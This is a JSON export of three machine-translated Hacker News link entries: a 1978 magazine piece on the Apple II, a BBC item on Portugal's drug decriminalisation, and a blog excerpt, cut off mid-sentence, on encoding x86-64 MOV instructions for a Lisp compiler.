[{"category": "", "categoryclass": "", "imagename": "", "infoid": 1029718, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Internet Archive BookReader Creative Computing\u6742\u5fd7(1978\u5e745\u6708)\u7b2c04\u5377\u7b2c03\u671f", "note_en": "Internet Archive BookReader    Creative Computing Magazine (May 1978) Volume 04 Number 03", "posttime": "2020-10-19 13:54:55", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "apple,\u7535\u8111,ii,archive", "title": "\u4e3a\u4ec0\u4e48Apple II\u662f\u4e16\u754c\u4e0a\u6700\u7545\u9500\u7684\u4e2a\u4eba\u7535\u8111(1978)", "title_en": "Why Apple II Is the World's Best Selling Personal Computer (1978)", "transed": 1, "url": "https://archive.org/stream/creativecomputing-1978-05/Creative_Computing_v04_n03_1978_May-June#page/n6/mode/2up", "via": "", "real_tags": ["apple", "\u7535\u8111", "ii", "archive"]}, {"category": "", "categoryclass": "", "imagename": "8e17479b87cb1b7844e19a5cf79e4601.jpg", "infoid": 1029717, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4e0a\u4e16\u7eaa90\u5e74\u4ee3\uff0c\u8461\u8404\u7259\u662f\u6b27\u6d32\u670d\u836f\u8fc7\u91cf\u6b7b\u4ea1\u7387\u6700\u9ad8\u7684\u56fd\u5bb6\u4e4b\u4e00\uff0c\u4e5f\u662f\u5438\u6bd2\u8005\u4e2d\u827e\u6ecb\u75c5\u6bd2\u611f\u67d3\u7387\u6700\u9ad8\u7684\u56fd\u5bb6\u4e4b\u4e00\u3002\u4e3a\u4e86\u5e94\u5bf9\u8fd9\u4e00\u516c\u5171\u536b\u751f\u7d27\u6025\u60c5\u51b5\uff0c\u8461\u8404\u7259\u653f\u5e9c\u6210\u7acb\u4e86\u4e00\u4e2a\u4e13\u5bb6\u5c0f\u7ec4\uff0c\u4ee5\u5236\u5b9a\u4e00\u9879\u5168\u56fd\u6027\u7684\u6218\u7565\u3002\u8be5\u59d4\u5458\u4f1a\u63d0\u51fa\u4e86\u4e00\u7cfb\u5217\u6fc0\u8fdb\u63aa\u65bd\uff0c\u5305\u62ec\u5c06\u6240\u6709\u4e2a\u4eba\u4f7f\u7528\u7684\u6bd2\u54c1\u5408\u6cd5\u5316\u3002\u6bd2\u54c1\u653f\u7b56\u7684\u8bbe\u8ba1\u8005\u4e4b\u4e00\u82e5\u6602\u00b7\u53e4\u52b3\u535a\u58eb(Jo\u00e3o Gul\u00e3o)\u8ba8\u8bba\u4e86\u8be5\u6218\u7565\u7684\u6210\u529f\u4e4b\u5904\u3002", "note_en": "In the '90s, Portugal had one of the worst rates of overdose deaths in Europe, as well as the highest rate of HIV among drug users. In response to this public health emergency, Portugal's government set up a group of experts to come up with a nationwide strategy. The committee proposed a raft of radical measures including the decriminalisation of all drugs for personal use. Dr Jo\u00e3o Goul\u00e3o, one of the architects of the drugs policy, discusses the success of the strategy.", "posttime": "2020-10-19 13:54:47", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u6bd2\u54c1,portugal", "title": "\u8461\u8404\u7259\u5c06\u6240\u6709\u6bd2\u54c1\u5408\u6cd5\u5316\u540e\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f", "title_en": "What happened after Portugal decriminalised all drugs?", "transed": 1, "url": "https://www.bbc.com/reel/video/p08v4850/what-happened-after-this-country-decriminalised-all-drugs-", "via": "", "real_tags": ["\u6bd2\u54c1", "portugal"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1029716, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6b22\u8fce\u56de\u5230\u7f16\u8bd1Lisp\u7cfb\u5217\u3002\u5728\u8fd9\u4e2a\u6fc0\u52a8\u4eba\u5fc3\u7684\u65b0\u66f4\u65b0\u4e2d\uff0c\u6211\u4eec\u5c06\u5b66\u4e60\u66f4\u591a\u5173\u4e8ex86-64\u6307\u4ee4\u7f16\u7801\u7684\u77e5\u8bc6\uff0c\u800c\u4e0d\u662f\u5728\u5806\u4e0a\u5206\u914d\u66f4\u591a\u6709\u8da3\u7684\u4e1c\u897f\u6216\u6dfb\u52a0\u8fc7\u7a0b\u8c03\u7528\u3002\n\u6211\u4e4b\u6240\u4ee5\u5199\u8fd9\u6bb5\u63d2\u66f2\uff0c\u662f\u56e0\u4e3a\u6211\u628a\u7f16\u8bd1\u5668\u4ee3\u7801\u4e2d\u7684\u4e00\u4e2a\u5bc4\u5b58\u5668(krbp\u6539\u6210\u4e86krsp)\uff0c\u6240\u6709\u7684\u5730\u72f1\u90fd\u5d29\u6e83\u4e86-\u7ed3\u679c\u7a0b\u5e8f\u5d29\u6e83\u4e86\uff0crasm2/Cutter\u5728\u7ed9\u6211\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u65f6\u89e3\u7801\u53e4\u602a\u7684\u6307\u4ee4\uff0c\u7b49\u7b49\u3002\u5728\u4e24\u4e2a\u975e\u5e38\u6709\u8da3\u4f46\u975e\u5e38\u4ee4\u4eba\u6cae\u4e27\u7684\u5c0f\u65f6\u91cc\uff0c\u6211\u4e86\u89e3\u4e86\u4e3a\u4ec0\u4e48\u4f1a\u6709\u8fd9\u4e9b\u95ee\u9898\u4ee5\u53ca\u5982\u4f55\u89e3\u51b3\u5b83\u4eec\u3002\u4f60\u4e5f\u5e94\u8be5\u5b66\u4e00\u5b66\u3002\nVoid emit_mov_reg_imm32(buffer*buf\uff0cRegister dst\uff0cint32_t src){buffer_write8(buf\uff0ckRexPrefix)\uff1bbuffer_write8(buf\uff0c0xc7)\uff1bbuffer_write8(buf\uff0c0xc0+dst)\uff1bbuffer_write32(buf\uff0csrc)\uff1b}\u3002\n\u8fd9\u4e9b\u51fd\u6570\u90fd\u58f0\u79f0\u8981\u5bf9x86-64\u6307\u4ee4\u8fdb\u884c\u7f16\u7801\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u4ed6\u4eec\u662f\u8fd9\u6837\u505a\u7684\uff0c\u4f46\u4ed6\u4eec\u4e0d\u4f1a\u8bb2\u8ff0\u6574\u4e2a\u6545\u4e8b\u3002\u6b64\u51fd\u6570\u5047\u5b9a\u5bf9mov reg64\uff0cimm32\u683c\u5f0f\u7684\u6307\u4ee4\u8fdb\u884c\u7f16\u7801\u3002\u5b83\u662f\u600e\u4e48\u505a\u5230\u7684\uff1f\u6211\u4e0d\u77e5\u9053!\u3002\n\u4ed6\u4eec\u91cc\u9762\u90fd\u6709\u8fd9\u4e9b\u795e\u5947\u7684\u6570\u5b57\uff01\u4ec0\u4e48\u662fkRexPrefix\uff1f\u55ef\uff0c\u73b0\u5728\u662f0x48\u3002\u8fd9\u5bf9\u6211\u4eec\u6709\u4ec0\u4e48\u610f\u4e49\u5417\uff1f\u4e0d\uff01\u60c5\u51b5\u53d8\u5f97\u66f4\u7cdf\u4e86\u30020xc7\u548c0xc0\u5728\u90a3\u91cc\u505a\u4ec0\u4e48\uff1f\u4e3a\u4ec0\u4e48\u6211\u4eec\u8981\u5c06DST\u6dfb\u52a0\u52300xc0\uff1f\u5728\u8fd9\u573a\u8c03\u8bd5\u548c\u9605\u8bfb\u76db\u4f1a\u4e4b\u524d\uff0c\u6211\u4e0d\u53ef\u80fd\u544a\u8bc9\u4f60\u3002\u8fd8\u8bb0\u5f97\u6211\u5728\u4e0a\u4e00\u7bc7\u6587\u7ae0\u4e2d\u63d0\u5230\u7684\u6211\u662f\u5982\u4f55\u4eceCompiler Explorer\u4e0a\u8bfb\u53d6\u7f16\u8bd1\u540e\u7684\u8f93\u51fa\u4e2d\u83b7\u5f97\u8fd9\u4e9b\u5341\u516d\u8fdb\u5236\u5b57\u8282\u7684\u5417\uff1f\u55ef\u3002\n\u4e8b\u5b9e\u8bc1\u660e\uff0c\u8fd9\u4e0d\u662f\u4e00\u4e2a\u5065\u58ee\u7684\u5f00\u53d1\u7b56\u7565\uff0c\u81f3\u5c11\u5bf9\u4e8ex86-64\u662f\u8fd9\u6837\u3002\u5bf9\u4e8e\u4e00\u4e9b\u66f4\u89c4\u5219\u6216\u66f4\u53ef\u9884\u6d4b\u7684\u6307\u4ee4\u96c6\uff0c\u5b83\u53ef\u80fd\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u4e0d\u662f\u8fd9\u4e2a\u6307\u4ee4\u96c6\u3002\n\u90a3\u4e48\u6211\u4eec\u63a5\u4e0b\u6765\u8981\u53bb\u54ea\u91cc\u5462\uff1f\u6211\u4eec\u5982\u4f55\u627e\u51fa\u5982\u4f55\u5c06\u8fd9\u4e9b\u795e\u79d8\u7684\u9b54\u6cd5\u548c\u5492\u8bed\u5e26\u5230\u66f4\u597d\u5730\u6620\u5c04\u5230\u786c\u4ef6\u4e0a\u7684\u4e1c\u897f\u4e0a\u5462\uff1f\u90a3\u4e48\uff0c\u6211\u4eec\u518d\u4e00\u6b21\u5c06Tom 1\u62d6\u5165\u8c03\u8bd5\u4f1a\u8bdd\uff0c\u5e76\u8c03\u51fa\u5927\u53f7\u7684\u201c\u82f1\u7279\u5c14\u8f6f\u4ef6\u5f00\u53d1\u4eba\u5458\u624b\u518c\u201d(Intel Software Developer Manual)\u3002\n\u8fd9\u662f\u4e00\u672c\u957f\u8fbe26MB\u30015000\u9875\u7684\u624b\u518c\uff0c\u7531\u56db\u5377\u7ec4\u6210\u3002\u8fd9\u975e\u5e38\u5413\u4eba\u3002\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6211\u4e0d\u60f3\u65e9\u70b9\u628a\u5b83\u62d4\u51fa\u6765\uff0c\u4ece\u4e00\u5f00\u59cb\u5c31\u6b63\u786e\u5730\u505a\u8fd9\u4ef6\u4e8b\u7684\u539f\u56e0\u2026\u3002\u4f46\u6211\u4eec\u5230\u4e86\u8fd9\u91cc\uff0c\u6700\u7ec8\u9700\u8981\u505a\u597d\u8fd9\u4ef6\u4e8b\u3002\n\u6211\u4e0d\u4f1a\u5047\u88c5\u7406\u89e3\u8fd9\u672c\u624b\u518c\u7684\u5168\u90e8\u5185\u5bb9\uff0c\u8fd9\u7bc7\u6587\u7ae0\u4e5f\u4e0d\u4f1a\u6210\u4e3a\u624b\u518c\u7684\u6307\u5357\u3002\u6211\u5c06\u53ea\u89e3\u91ca\u6211\u53d1\u73b0\u54ea\u4e9b\u90e8\u5206\u548c\u56fe\u8868\u5bf9\u7406\u89e3\u8fd9\u4e9b\u4e1c\u897f\u662f\u5982\u4f55\u5de5\u4f5c\u6709\u7528\u7684\u3002\n\u6211\u53ea\u6253\u5f00\u8fc7\u7b2c\u4e8c\u5377\uff0c\u6307\u4ee4\u96c6\u53c2\u8003\u3002\u5728\u55e1\u55e1\u4f5c\u54cd2300\u9875\u4e2d\uff0c\u63cf\u8ff0\u4e86\u6bcf\u6761Intelx86-64\u6307\u4ee4\u53ca\u5176\u7f16\u7801\u65b9\u5f0f\u3002\u6307\u4ee4\u6309\u5b57\u6bcd\u987a\u5e8f\u5217\u51fa\uff0c\u5e76\u6839\u636e\u6bcf\u4e2a\u6307\u4ee4\u540d\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u62c6\u5206\u96c6\u5408\u3002\n\u8ba9\u6211\u4eec\u6765\u770b\u770b\u7b2c3\u7ae0\uff0c\u7279\u522b\u662f\u7b2c1209\u9875\u7684MOV\u6307\u4ee4\u3002\u5bf9\u4e8e\u90a3\u4e9b\u4e0d\u60f3\u4e0b\u8f7d\u5927\u91cfPDF\u7684\u8bfb\u8005\uff0c\u672c\u7f51\u7ad9\u63d0\u4f9b\u4e86\u4e00\u7ec4HTML\u683c\u5f0f\u7684\u76f8\u540c\u6570\u636e\u3002\u8fd9\u662fMOV\u7684\u9875\u9762\u3002\n\u6b64\u9875\u9762\u5305\u542bMOV\u6307\u4ee4\u7684\u6240\u6709\u53d8\u4f53\u3002\u8fd8\u6709\u5176\u4ed6\u4ee5MOV\u5f00\u5934\u7684\u6307\u4ee4\uff0c\u5982MOVAPD\u3001MOVAPS\u7b49\uff0c\u4f46\u5b83\u4eec\u7684\u5dee\u5f02\u8db3\u591f\u5927\uff0c\u4ee5\u81f3\u4e8e\u5b83\u4eec\u662f\u4e0d\u540c\u7684\u6307\u4ee4\u3002\n\u64cd\u4f5c\u7801\uff0c\u5b83\u63cf\u8ff0\u4e86\u6307\u4ee4\u6d41\u4e2d\u5b57\u8282\u7684\u5e03\u5c40\u3002\u5b83\u63cf\u8ff0\u4e86\u6211\u4eec\u5c06\u5982\u4f55\u5bf9\u6307\u4ee4\u8fdb\u884c\u7f16\u7801\u3002\n\u6307\u4ee4\uff0c\u5b83\u7ed9\u51fa\u6307\u4ee4\u7684\u7c7b\u4f3c\u6587\u672c\u6c47\u7f16\u7684\u8868\u793a\u5f62\u5f0f\u3002\u8fd9\u5bf9\u4e8e\u627e\u51fa\u6211\u4eec\u5b9e\u9645\u4e0a\u60f3\u8981\u7f16\u7801\u7684\u662f\u54ea\u4e00\u4e2a\u5f88\u6709\u7528\u3002\nOP/EN\u4ee3\u8868\u201c\u64cd\u4f5c\u6570\u7f16\u7801\u201d\uff0c\u636e\u6211\u6240\u77e5\uff0c\u5b83\u4f7f\u7528\u4e00\u4e2a\u7b26\u53f7\u6765\u63cf\u8ff0\u64cd\u4f5c\u6570\u987a\u5e8f\uff0c\u4e0b\u4e00\u9875\u7684\u201c\u6307\u4ee4\u64cd\u4f5c\u6570\u7f16\u7801\u201d\u8868\u4e2d\u5c06\u8fdb\u4e00\u6b65\u89e3\u91ca\u8be5\u7b26\u53f7\u3002\n64\u4f4d\u6a21\u5f0f\uff0c\u5b83\u544a\u8bc9\u60a8\u6307\u4ee4\u662f\u5426\u53ef\u4ee5\u572864\u4f4d\u6a21\u5f0f\u4e0b\u4f7f\u7528(\u201c\u6709\u6548\u201d)\u6216\u4e0d\u53ef\u4ee5(\u6211\u731c\u662f\u5176\u4ed6\u6a21\u5f0f)\u3002\nCompat/Leg\u6a21\u5f0f\uff0c\u5b83\u544a\u8bc9\u60a8\u6307\u4ee4\u662f\u5426\u53ef\u4ee5\u5728\u5176\u4ed6\u6a21\u5f0f\u4e0b\u4f7f\u7528\uff0c\u6211\u8ba4\u4e3a\u662f32\u4f4d\u6a21\u5f0f\u8fd8\u662f16\u4f4d\u6a21\u5f0f\u3002\u6211\u4e0d\u77e5\u9053\u3002\u4f46\u8fd9\u4e0e\u6211\u4eec\u65e0\u5173\u3002\nDESCRIPTION\uff0c\u5b83\u63d0\u4f9b\u64cd\u4f5c\u7801\u7684\u201c\u7b80\u660e\u82f1\u8bed\u201d\u63cf\u8ff0\uff0c\u7528\u4e8e\u5355\u8bcd\u201c\u7b80\u660e\u201d\u548c\u201c\u82f1\u8bed\u201d\u7684\u4e00\u4e9b\u5b9a\u4e49\u3002\n\u5176\u4ed6\u8bf4\u660e\u7684\u8868\u683c\u5e03\u5c40\u7565\u6709\u4e0d\u540c\uff0c\u56e0\u6b64\u60a8\u5fc5\u987b\u5f04\u6e05\u695a\u5176\u4ed6\u5217\u7684\u542b\u4e49\u3002\n\u4e0b\u9762\u662f\u8868\u683c\u4e2d\u4e00\u4e9b\u884c\u7684\u9884\u89c8\uff0cHTML\u7531FelixCloutier\u524d\u9762\u63d0\u5230\u7684Web\u6587\u6863\u63d0\u4f9b\uff1a\n\u5982\u679c\u60a8\u67e5\u770b\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u6761\u76ee\uff0c\u60a8\u5c06\u770b\u5230REX.W+C7/0id\u3002\u8fd9\u770b\u8d77\u6765\u773c\u719f\u5417\uff1f\u4e5f\u8bb8\u5427\uff0c\u5982\u679c\u4f60\u772f\u7740\u773c\u775b\u770b\u4e00\u4e0b\u7684\u8bdd\uff1f\n\u7ed3\u679c\u53d1\u73b0\uff0c\u8fd9\u5c31\u662f\u5bf9\u6211\u4eec\u6700\u521d\u60f3\u8981\u7684\u6307\u4ee4\u8fdb\u884c\u7f16\u7801\u7684\u63cf\u8ff0\uff0c\u4f46\u662f\u5b83\u7684\u7f16\u7801\u5668\u5f88\u7cdf\u7cd5\u3002\u8ba9\u6211\u4eec\u8bd5\u7740\u60f3\u529e\u6cd5\u7528\u8fd9\u4e2a\u6765\u4f7f\u6211\u4eec\u7684\u7f16\u7801\u5668\u505a\u5f97\u66f4\u597d\u3002\u8981\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u4e86\u89e3\u82f1\u7279\u5c14\u6307\u4ee4\u7684\u4e00\u822c\u5e03\u5c40\u3002\n\u6211\u5728\u7b2c2\u5377\u7b2c2\u7ae0(\u7b2c527\u9875)\u7684\u5f00\u5934\u90e8\u5206\u201c\u4fdd\u62a4\u6a21\u5f0f\u3001\u771f\u5b9e\u5730\u5740\u6a21\u5f0f\u548c\u865a\u62df8086\u6a21\u5f0f\u7684\u6307\u4ee4\u683c\u5f0f\u201d\u4e2d\u627e\u5230\u4e86\u8fd9\u4e9b\u4fe1\u606f\u3002\n\u60a8\u53ef\u80fd\u548c\u6211\u4e00\u6837\u60f3\u77e5\u9053\u201cOptional\u201d\u3001\u201cIf Required\u201d\u548c\u201c\u2026\u201d\u4e4b\u95f4\u7684\u533a\u522b\u3002\uff0c\u6216\u8005\u4e00\u4e2a\u4e5f\u6ca1\u6709\u201c\u3002\u6211\u65e0\u6cd5\u89e3\u91ca\uff0c\u62b1\u6b49\u3002\n\u6211\u5c06\u5728\u8fd9\u91cc\u7b80\u8981\u89e3\u91ca\u6bcf\u4e2a\u7ec4\u4ef6\uff0c\u7136\u540e\u9010\u4e2a\u5256\u6790\u6211\u4eec\u60f3\u8981\u7684\u7279\u5b9aMOV\u6307\u4ee4\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u4e00\u4e9b\u5b9e\u8df5\u7ec3\u4e60\u3002\n\u6709\u51e0\u79cd\u6307\u4ee4\u524d\u7f00\uff0c\u5982REX(\u7b2c2.2.1\u8282)\u548cVEX(\u7b2c2.3\u8282)\u3002\u6211\u4eec\u5c06\u91cd\u70b9\u4ecb\u7ecdREX\u524d\u7f00\uff0c\u56e0\u4e3a\u8bb8\u591a\u4eba(\u5927\u591a\u6570\uff1f)\u90fd\u9700\u8981\u5b83\u4eec\u3002X86-64\u6307\u4ee4\uff0c\u6211\u4eec\u6ca1\u6709\u53d1\u51fa\u5411\u91cf\u6307\u4ee4\u3002\nREX\u524d\u7f00\u7528\u4e8e\u6307\u793a\u901a\u5e38\u53ef\u80fd\u5f15\u752832\u4f4d\u5bc4\u5b58\u5668\u7684\u6307\u4ee4\u5e94\u8be5\u6539\u4e3a\u5f15\u752864\u4f4d\u5bc4\u5b58\u5668\u3002\u4e5f\u6709\u4e00\u4e9b\u5176\u4ed6\u7684\u4e1c\u897f\uff0c\u4f46\u662f\u6211\u4eec\u6700\u5173\u5fc3\u7684\u662f\u5bc4\u5b58\u5668\u7684\u5927\u5c0f\u3002\n\u6709\u5173\u64cd\u4f5c\u7801\u7684\u7b80\u8981\u8bf4\u660e\uff0c\u8bf7\u53c2\u9605\u7b2c2.1.2\u8282(\u7b2c529\u9875)\u3002\u5176\u8981\u70b9\u662f\u64cd\u4f5c\u7801\u662f\u6307\u4ee4\u7684\u6838\u5fc3\u3002\u8fd9\u662fMova MOV\u800c\u4e0d\u662f\u505c\u6b62\u7684\u539f\u56e0\u3002\u5176\u4ed6\u5b57\u6bb5\u90fd\u4f1a\u4fee\u6539\u6b64\u5b57\u6bb5\u6240\u8d4b\u4e88\u7684\u542b\u4e49\u3002\n\u6709\u5173ModR/M\u548cSIB\u5b57\u8282\u7684\u7b80\u8981\u8bf4\u660e\uff0c\u8bf7\u53c2\u9605\u7b2c2.1.3\u8282(\u7b2c529\u9875)\u3002\u8981\u70b9\u662f\u5b83\u4eec\u5bf9\u8981\u4f7f\u7528\u7684\u5bc4\u5b58\u5668\u6e90\u548c\u76ee\u6807\u8fdb\u884c\u7f16\u7801\u3002\n\u6709\u5173\u4f4d\u79fb\u548c\u7acb\u5373\u5b57\u8282\u7684\u7b80\u8981\u8bf4\u660e\uff0c\u8bf7\u53c2\u9605\u7b2c2.1.4\u8282(\u7b2c529\u9875)\u3002\u8981\u70b9\u662f\u5b83\u4eec\u5bf9\u6307\u4ee4\u4e2d\u4f7f\u7528\u7684\u6587\u5b57\u6570\u5b57\u8fdb\u884c\u7f16\u7801\uff0c\u800c\u4e0d\u5bf9\u5bc4\u5b58\u5668\u6216\u4efb\u4f55\u4e1c\u897f\u8fdb\u884c\u7f16\u7801\u3002\n\u5982\u679c\u4f60\u7cca\u6d82\u4e86\uff0c\u6ca1\u5173\u7cfb\u3002\u4e00\u65e6\u6211\u4eec\u628a\u624b\u5f04\u810f\u4e86\uff0c\u60c5\u51b5\u53ef\u80fd\u4f1a\u53d8\u5f97\u66f4\u660e\u6717\u3002\u5982\u679c\u8fd9\u662f\u60a8\u7b2c\u4e00\u6b21\u50cf\u8fd9\u6837\u5904\u7406\u6c47\u7f16\uff0c\u90a3\u4e48\u5728\u771f\u7a7a\u4e2d\u9605\u8bfb\u6240\u6709\u8fd9\u4e9b\u4fe1\u606f\u662f\u76f8\u5f53\u6709\u7528\u7684\uff0c\u4f46\u6211\u9996\u5148\u5305\u542b\u8fd9\u4e00\u8282\u662f\u4e3a\u4e86\u5e2e\u52a9\u89e3\u91ca\u5982\u4f55\u4f7f\u7528\u53c2\u8003\u8d44\u6599\u3002\n\u90fd\u62ff\u5230\u4e86\u5417\uff1f\u4e5f\u8bb8\u5427?\u3002\u4e0d\u662f\u5417\uff1f\u662f\u554a\uff0c\u6211\u4e5f\u662f\u3002\u4f46\u4e0d\u7ba1\u600e\u6837\uff0c\u8ba9\u6211\u4eec\u7ee7\u7eed\u524d\u8fdb\u5427\u3002\u4e0b\u9762\u662f\u6211\u4eec\u8981\u7f16\u7801\u7684\u6307\u4ee4\uff1aREX.W+C7/0id\u3002\n\u9996\u5148\uff0c\u8ba9\u6211\u4eec\u4e86\u89e3\u4e00\u4e0bREX.W\u3002\u6839\u636e\u66f4\u8be6\u7ec6\u5730\u89e3\u91caREX\u524d\u7f00\u7684\u7b2c2.2.1\u8282\uff0c\u6709\u51e0\u4e2a\u4e0d\u540c\u7684\u524d\u7f00\u3002\u6709\u4e00\u4e2a\u6709\u7528\u7684\u8868\u683c(\u7b2c535\u9875\u7684\u88682-4)\u8bb0\u5f55\u4e86\u5b83\u4eec\u3002\u4ee5\u4e0b\u662f\u5305\u542b\u76f8\u540c\u4fe1\u606f\u7684\u4f4d\u56fe\uff1a\n0100 W R X B\u9ad8\u4f4d\u4f4e\u4f4dREX\u4f4d3\u662fW\u524d\u7f00\u3002\u5982\u679c\u4e3a1\uff0c\u5219\u8868\u793a\u64cd\u4f5c\u6570\u4e3a64\u4f4d\u3002\u5982\u679c\u4e3a0\uff0c\u5219\u201c\u64cd\u4f5c\u6570\u5927\u5c0f[\u7531CS.D\u786e\u5b9a]\u201d\u3002\u4e0d\u786e\u5b9a\u90a3\u662f\u4ec0\u4e48\u610f\u601d\u3002\n\u4f4d2\u30011\u548c0\u662f\u6211\u4eec\u6700\u7ec8\u53ef\u80fd\u4e0d\u4f1a\u4f7f\u7528\u7684\u5176\u4ed6\u7c7b\u578b\u7684REX\u524d\u7f00\uff0c\u56e0\u6b64\u6211\u5728\u8fd9\u91cc\u7701\u7565\u5b83\u4eec\u3002\u5982\u679c\u4f60\u6709\u597d\u5947\u5fc3\uff0c\u8bf7\u8fdb\u4e00\u6b65\u9605\u8bfb\u624b\u518c\uff01\n\u6b64MOV\u6307\u4ee4\u8c03\u7528REX.W\uff0c\u8fd9\u610f\u5473\u7740\u6b64\u5b57\u8282\u5c06\u7c7b\u4f3c\u4e8e0b01001000\uff0c\u4e5f\u79f0\u4e3a\u6211\u4eec\u7684\u670b\u53cb0x48\u3002\u4e00\u53f7\u8c1c\u56e2\uff0c\u89e3\u5f00\u4e86\uff01\n\u8fd9\u662f\u5341\u516d\u8fdb\u5236\u6587\u5b570xc7\u3002\u8fd9\u662f\u64cd\u4f5c\u7801\u3002\u8fd8\u6709\u51e0\u4e2a\u5177\u6709\u64cd\u4f5c\u7801C7\u7684\u5176\u4ed6\u6761\u76ee\uff0c\u7531\u6307\u4ee4\u4e2d\u7684\u5176\u4ed6\u5b57\u8282\u4fee\u6539(modr/M\u3001sib\u3001rex\u3001\u2026)\u3002\u90a3\u5c31\u662f\u3002\u5c06\u5176\u5199\u5165\u6307\u4ee4\u6d41\u3002\u7b2c\u4e8c\u4e2a\u8c1c\u56e2\uff0c\u89e3\u5f00\u4e86\uff01\n\u5982\u679c\u6307\u4ee4\u4e0d\u9700\u8981\u7b2c\u4e8c\u64cd\u4f5c\u6570\uff0c\u5219REG/OPCODE\u5b57\u6bb5\u53ef\u7528\u4f5c\u64cd\u4f5c\u7801\u6269\u5c55\u3002\u8fd9\u79cd\u7528\u6cd5\u7531\u8868\u4e2d\u7684\u7b2c\u516d\u884c(\u6807\u8bb0\u4e3a\u201c/digit(\u64cd\u4f5c\u7801)\u201d)\u8868\u793a\u3002\u8bf7\u6ce8\u610f\uff0c\u7b2c\u516d\u884c\u4e2d\u7684\u503c\u4ee5\u5341\u8fdb\u5236\u5f62\u5f0f\u8868\u793a\u3002\n\u8fd9\u6709\u70b9\u6df7\u4e71\uff0c\u56e0\u4e3a\u6b64\u64cd\u4f5c\u663e\u7136\u6709\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\uff0c\u7531\u8868\u4e2d\u7684\u201cMI\u201d\u8868\u793a\uff0c\u5b83\u663e\u793a\u64cd\u4f5c\u65701\u4e3aModRM\uff1ar/m(W)\uff0c\u64cd\u4f5c\u65702\u4e3aimm8/16/32/64\u3002\u6211\u8ba4\u4e3a\u8fd9\u662f\u56e0\u4e3a\u5b83\u6ca1\u6709\u7b2c\u4e8c\u4e2a\u5bc4\u5b58\u5668\u64cd\u4f5c\u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u7a7a\u95f4\u662f\u7a7a\u95f2\u7684-\u7acb\u5373\u6570\u5728\u6307\u4ee4\u4e2d\u7684\u4e0d\u540c\u4f4d\u7f6e\u3002\n\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5fc5\u987b\u786e\u4fdd\u5728ModR/M\u5b57\u8282\u7684reg\u90e8\u5206\u653e\u5165\u5341\u8fdb\u52360\u3002\u7a0d\u540e\u6211\u4eec\u5c06\u8be6\u7ec6\u4ecb\u7ecdModR/M\u5b57\u8282\u3002\nID\u662f\u6307\u7acb\u5373\u53cc\u5b57(32\u4f4d)\u3002\u5b83\u88ab\u79f0\u4e3a\u53cc\u5b57\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57(Iw)\u662f16\u4f4d\u3002\u6309\u89c4\u6a21\u9012\u589e\u7684\u987a\u5e8f\uff0c\u6211\u4eec\u6709\uff1a\n\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5fc5\u987b\u5c06\u6211\u4eec\u768432\u4f4d\u503c\u5199\u51fa\u5230\u6307\u4ee4\u6d41\u4e2d\u3002\u8fd9\u4e9b\u7b26\u53f7\u548c\u7f16\u7801\u57283.1.1.1\u8282(\u7b2c596\u9875)\u4e2d\u6709\u8fdb\u4e00\u6b65\u7684\u89e3\u91ca\u3002\nREX Op ModR/M IMMEDIATE 0 1 2 3 7\u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u5bf9\u7279\u5b9a\u6307\u4ee4mov rax\uff0c100\u8fdb\u884c\u7f16\u7801\uff0c\u5b83\u5c06\u5982\u4e0b\u6240\u793a\uff1a\nREX Op ModR/M Immediate 0 1 2 3 7 0x48 0xc7 0xc0 0x64 0x00 0x00 0x00\u8fd9\u5c31\u662f\u60a8\u9605\u8bfb\u8868\u683c\u7684\u65b9\u5f0f\uff01\u6162\u6162\u5730\uff0c\u4e00\u5757\u4e00\u5757\u5730\uff0c\u7528\u4e00\u676f\u597d\u8336\u6765\u5e2e\u52a9\u4f60\u6e21\u8fc7\u96be\u5173\u3002\u73b0\u5728\u6211\u4eec\u5df2\u7ecf\u8bfb\u5b8c\u4e86\u8868\uff0c\u8ba9\u6211\u4eec\u7ee7\u7eed\u7f16\u5199\u4e00\u4e9b\u4ee3\u7801\u3002\n\u5728\u7f16\u5199\u4ee3\u7801\u65f6\uff0c\u60a8\u901a\u5e38\u9700\u8981\u6bd4\u6211\u4eec\u5230\u76ee\u524d\u4e3a\u6b62\u770b\u5230\u7684\u8868\u591a\u5f15\u7528\u4e24\u4e2a\u8868\u3002\u8fd9\u4e9b\u8868\u683c\u662f\u88682-2\u201c\u5177\u6709ModR/M\u5b57\u8282\u768432\u4f4d\u5bfb\u5740\u8868\u5355\u201d(\u7b2c532\u9875)\u548c\u88682-3\u201c\u5e26\u6709SIB\u5b57\u8282\u768432\u4f4d\u5bfb\u5740\u8868\u5355\u201d(\u7b2c533\u9875)\u3002\u867d\u7136\u8fd9\u4e9b\u8868\u63cf\u8ff0\u7684\u662f32\u4f4d\u7684\u91cf\uff0c\u4f46\u662f\u6709\u4e86REX\u524d\u7f00\uff0c\u6240\u6709\u7684ES\u90fd\u88ab\u66ff\u6362\u4e3aR\uff0c\u5e76\u4e14\u7a81\u7136\u4e4b\u95f4\u5b83\u4eec\u5c31\u53ef\u4ee5\u63cf\u8ff064\u4f4d\u7684\u91cf\u4e86\u3002\n\u5728\u5f04\u6e05\u695a\u5982\u4f55\u5c06ModR/M